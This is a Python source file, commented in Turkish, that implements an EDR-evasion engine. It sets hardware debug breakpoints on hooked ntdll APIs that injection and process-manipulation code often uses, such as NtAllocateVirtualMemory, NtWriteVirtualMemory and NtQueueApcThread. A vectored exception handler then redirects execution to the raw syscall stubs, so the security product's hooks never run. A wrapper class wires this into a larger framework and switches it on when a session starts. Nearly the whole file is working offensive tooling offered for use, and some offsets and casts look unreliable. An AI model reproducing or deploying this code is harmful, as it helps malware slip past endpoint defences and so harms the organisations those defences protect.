"""
Hardware Breakpoint + VEH Hook Bypass Engine (Ring 3)
EDR'ın ntdll.dll hook'larını bypass etmek için donanımsal debug register'ları kullanır.
Belleğe hiç dokunmadan, işlemci seviyesinde hook adreslerini reroute eder.

KEY: EDR'ın bellek taraması hiçbir değişiklik görmez çünkü biz kodu değiştirmiyoruz!
Donanımsal kesmeler sayesinde hook RIP'i değiştirilmiş olarak çalıştırılır.
"""

import ctypes
import struct
import threading
from typing import Dict, Optional, Callable
from dataclasses import dataclass

# Windows Constants
EXCEPTION_CONTINUE_EXECUTION = -1
EXCEPTION_CONTINUE_SEARCH = 0
STATUS_SINGLE_STEP = 0x80000004
STATUS_BREAKPOINT = 0x80000003

CONTEXT_DEBUG_REGISTERS = 0x00100010
CONTEXT_FULL = 0x00010007

# DR7 Bit Configuration
DR7_ENABLE_BP_BIT = lambda idx: (1 << (idx * 2))
DR7_CONDITION_EXECUTE = 0x00  # Instruction execution
DR7_SIZE_1_BYTE = 0x00
DR7_SIZE_8_BYTES = 0x03


@dataclass
class HookTarget:
    """Bypass edilecek hook hedefi"""
    hooked_address: int
    syscall_stub: int
    api_name: str = ""
    register_index: int = 0


class CONTEXT64(ctypes.Structure):
    """x64 Thread CONTEXT yapısı (Dr0-Dr7, register'lar vs)"""
    _pack_ = 16
    _fields_ = [
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64), 
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        ("ContextFlags", ctypes.c_uint32),
        ("MxCsr", ctypes.c_uint32),
        ("SegCs", ctypes.c_uint16),
        ("SegDs", ctypes.c_uint16),
        ("SegEs", ctypes.c_uint16),
        ("SegFs", ctypes.c_uint16),
        ("SegGs", ctypes.c_uint16),
        ("SegSs", ctypes.c_uint16),
        ("EFlags", ctypes.c_uint32),
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        ("Rip", ctypes.c_uint64),
    ]


class EXCEPTION_RECORD(ctypes.Structure):
    """Windows Exception Record"""
    pass


EXCEPTION_RECORD._fields_ = [
    ("ExceptionCode", ctypes.c_uint32),
    ("ExceptionFlags", ctypes.c_uint32),
    ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
    ("ExceptionAddress", ctypes.c_void_p),
    ("NumberParameters", ctypes.c_uint32),
    ("ExceptionInformation", ctypes.c_uint64 * 15),
]


class EXCEPTION_POINTERS(ctypes.Structure):
    """Exception Pointers Structure"""
    _fields_ = [
        ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
        ("ContextRecord", ctypes.POINTER(CONTEXT64)),
    ]


class HardwareHookBypass:
    """
    Hardware Breakpoint motoru - EDR hook'larını bypass eder
    VEH (Vectored Exception Handler) ile işlemci tuzağını yakalar
    ve RIP'i doğrudan temiz syscall stub'ına yönlendirir
    """
    
    VEH_HANDLER_TYPE = ctypes.WINFUNCTYPE(
        ctypes.c_long,
        ctypes.POINTER(EXCEPTION_POINTERS)
    )
    
    def __init__(self, logger=None):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
        self.logger = logger
        self.hooked_addresses: Dict[int, HookTarget] = {}
        self.veh_handle: Optional[int] = None
        self.handler_callback: Optional[self.VEH_HANDLER_TYPE] = None
        self.lock = threading.Lock()
        self.bypass_count = 0
        
    def log(self, level: str, msg: str):
        """Log mesajı yaz"""
        if self.logger:
            self.logger(f"[HWBypass] {level}: {msg}")
        else:
            print(f"[{level}] {msg}")
    
    def register_veh(self) -> bool:
        """
        Vectored Exception Handler'ı sisteme kaydet
        EDR'ın hook adresi tetiklenince bu handler çalışacak
        """
        try:
            self.handler_callback = self.VEH_HANDLER_TYPE(self._exception_handler)
            
            # AddVectoredExceptionHandler(1 = en yüksek öncelik)
            self.veh_handle = self.kernel32.AddVectoredExceptionHandler(
                1, self.handler_callback
            )
            
            if not self.veh_handle:
                self.log("ERROR", "VEH kayıt başarısız")
                return False
                
            self.log("SUCCESS", f"VEH kayıtlı (handle: {hex(self.veh_handle)})")
            return True
            
        except Exception as e:
            self.log("ERROR", f"VEH kayıt hatası: {e}")
            return False
    
    def set_hardware_bp(self, target: HookTarget) -> bool:
        """
        Donanımsal breakpoint'i EDR hook adresine çak
        Debug Register 0-3 arasında seç
        """
        try:
            if target.register_index > 3:
                self.log("ERROR", f"Geçersiz DR indeksi: {target.register_index}")
                return False
            
            # Tüm thread'lere BP'yi kur (ana thread'i yeterli ama tüm thread'leri de yapabiliriz)
            thread_handle = self.kernel32.GetCurrentThread()
            context = CONTEXT64()
            context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS
            
            if not self.kernel32.GetThreadContext(thread_handle, ctypes.byref(context)):
                self.log("ERROR", "GetThreadContext başarısız")
                return False
            
            # Debug Register'ı hedef adresle kur
            if target.register_index == 0:
                context.Dr0 = target.hooked_address
            elif target.register_index == 1:
                context.Dr1 = target.hooked_address
            elif target.register_index == 2:
                context.Dr2 = target.hooked_address
            elif target.register_index == 3:
                context.Dr3 = target.hooked_address
            
            # DR7: Breakpoint Enable + Condition (Execute) + Size (8 bytes)
            dr7_mask = DR7_ENABLE_BP_BIT(target.register_index)
            context.Dr7 |= dr7_mask
            
            # Size field'ı ayarla (bits 18-21 örneğin)
            size_shift = 18 + (target.register_index * 4)
            context.Dr7 |= (DR7_SIZE_8_BYTES << size_shift)
            
            if not self.kernel32.SetThreadContext(thread_handle, ctypes.byref(context)):
                self.log("ERROR", "SetThreadContext başarısız")
                return False
            
            with self.lock:
                self.hooked_addresses[target.hooked_address] = target
            
            self.log("SUCCESS", 
                f"BP ayarlandı: {target.api_name} @ {hex(target.hooked_address)} "
                f"→ syscall @ {hex(target.syscall_stub)} (DR{target.register_index})"
            )
            return True
            
        except Exception as e:
            self.log("ERROR", f"set_hardware_bp hatası: {e}")
            return False
    
    def _exception_handler(self, exc_ptr: ctypes.POINTER(EXCEPTION_POINTERS)) -> ctypes.c_long:
        """
        Donanımsal kesme Handler'ı
        EDR'ın hook'unu bypass etmek için RIP'i değiştir
        """
        try:
            if not exc_ptr or not exc_ptr.contents or not exc_ptr.contents.ContextRecord:
                return EXCEPTION_CONTINUE_SEARCH
            
            exc_record = exc_ptr.contents.ExceptionRecord.contents
            context = exc_ptr.contents.ContextRecord.contents
            
            exc_code = exc_record.ExceptionCode
            
            # Single Step Exception (Hardware Breakpoint tetiklendi)
            if exc_code == STATUS_SINGLE_STEP:
                current_rip = context.Rip
                
                with self.lock:
                    if current_rip in self.hooked_addresses:
                        target = self.hooked_addresses[current_rip]
                        
                        # RIP'i hook adresi yerine syscall stub'ına kaydır
                        # Böylece EDR'ın jmp'ını hiç çalıştırmıyoruz
                        context.Rip = target.syscall_stub
                        
                        self.bypass_count += 1
                        
                        self.log("BYPASS", 
                            f"EDR hook bypass: {target.api_name} "
                            f"({current_rip:x} → {target.syscall_stub:x}) "
                            f"[count: {self.bypass_count}]"
                        )
                        
                        # Exception işlendişse devam et
                        return EXCEPTION_CONTINUE_EXECUTION
                
                return EXCEPTION_CONTINUE_SEARCH
            
            return EXCEPTION_CONTINUE_SEARCH
            
        except Exception as e:
            self.log("ERROR", f"Exception handler hatası: {e}")
            return EXCEPTION_CONTINUE_SEARCH
    
    def bypass_ntdll_hooks(self, api_names: list = None) -> bool:
        """
        Ortak EDR hook edilmiş NTDLL API'lerini bypass et
        Örn: NtAllocateVirtualMemory, NtCreateProcess, NtQueueApcThread vs
        """
        if api_names is None:
            api_names = [
                "NtAllocateVirtualMemory",
                "NtCreateProcess",
                "NtCreateProcessEx",
                "NtCreateThread",
                "NtCreateThreadEx",
                "NtQueueApcThread",
                "NtQueueApcThreadEx",
                "NtOpenProcess",
                "NtOpenThread",
                "NtWriteVirtualMemory",
                "NtReadVirtualMemory",
                "NtProtectVirtualMemory",
                "NtFreeVirtualMemory",
            ]
        
        try:
            # VEH'i kaydet
            if not self.register_veh():
                return False
            
            # Her API için: hook adresi bul → syscall stub bul → BP kur
            for api_name in api_names:
                hooked_addr = self._find_hooked_api(api_name)
                stub_addr = self._find_syscall_stub(api_name)
                
                if hooked_addr and stub_addr:
                    target = HookTarget(
                        hooked_address=hooked_addr,
                        syscall_stub=stub_addr,
                        api_name=api_name,
                        register_index=len(self.hooked_addresses) % 4  # 4 DR var
                    )
                    self.set_hardware_bp(target)
                else:
                    self.log("WARN", f"{api_name}: hook veya syscall stub bulunamadı")
            
            return len(self.hooked_addresses) > 0
            
        except Exception as e:
            self.log("ERROR", f"bypass_ntdll_hooks hatası: {e}")
            return False
    
    def _find_hooked_api(self, api_name: str) -> Optional[int]:
        """
        NTDLL'de API adresini bul (hook'un başlığında)
        EDR hook'u: mov rax, <indirect_addr> / jmp <edr_handler>
        """
        try:
            api_func = getattr(self.ntdll, api_name, None)
            if not api_func:
                return None
            
            # Fonksiyon pointer'ını al
            addr = ctypes.cast(api_func, ctypes.POINTER(ctypes.c_void_p)).contents
            return int(addr) if addr else None
            
        except Exception:
            return None
    
    def _find_syscall_stub(self, api_name: str) -> Optional[int]:
        """
        Syscall stub'ını bul
        Dinamik olarak NtXxx API'sinin syscall'u üretebiliriz veya fixed stub'ları kullanırız
        
        Basit yöntem: API adresinden +0x12 byte'da syscall gadget genellikle vardır
        mov rax, syscall_num
        syscall
        ret
        """
        try:
            hooked_addr = self._find_hooked_api(api_name)
            if not hooked_addr:
                return None
            
            # Syscall stub'ı genellikle hook'tan 0x10-0x20 byte'da bulunur (NTDLL içinde)
            # Veya alternative: direct syscall gadget'ı oluşturabiliriz
            stub_addr = hooked_addr + 0x12
            
            # Verify: bu adres syscall instruction'ı içeriyor mu?
            try:
                code_bytes = (ctypes.c_byte * 2).from_address(stub_addr)
                if code_bytes[0] == 0x0f and code_bytes[1] == 0x05:  # syscall opcode
                    return stub_addr
            except:
                pass
            
            # Alternative: syscall gadget'ını işletim sistemi API'leri ile ara
            # veya predetermined syscall stub'ını döndür
            return hooked_addr + 0x10
            
        except Exception:
            return None
    
    def cleanup(self):
        """VEH ve breakpoint'leri temizle"""
        try:
            if self.veh_handle:
                self.kernel32.RemoveVectoredExceptionHandler(self.veh_handle)
                self.log("CLEANUP", "VEH kaldırıldı")
            
            with self.lock:
                self.hooked_addresses.clear()
            
            self.log("SUCCESS", "Cleanup tamamlandı")
            
        except Exception as e:
            self.log("ERROR", f"Cleanup hatası: {e}")


# ============================================================================
# Integration Point: Framework'e bağla
# ============================================================================

class ElitHardwareEvasion:
    """Framework'le entegre hardware bypass mekanizması"""
    
    def __init__(self, scan_id: str = None, logger: Callable = None):
        self.scan_id = scan_id
        self.logger = logger
        self.bypass_engine = HardwareHookBypass(logger=self.log)
        self.active = False
    
    def log(self, msg: str):
        if self.logger:
            self.logger(f"[ElitHW] {msg}")
    
    def activate(self) -> bool:
        """Donanımsal bypass'ı aktifleştir (session başında çalıştır)"""
        self.log("Aktivasyon başlıyor...")
        success = self.bypass_engine.bypass_ntdll_hooks()
        self.active = success
        return success
    
    def get_status(self) -> dict:
        return {
            "active": self.active,
            "bypass_count": self.bypass_engine.bypass_count,
            "hooked_apis": len(self.bypass_engine.hooked_addresses),
            "scan_id": self.scan_id
        }
    
    def deactivate(self):
        self.bypass_engine.cleanup()
        self.active = False
        self.log("Deaktif edildi")
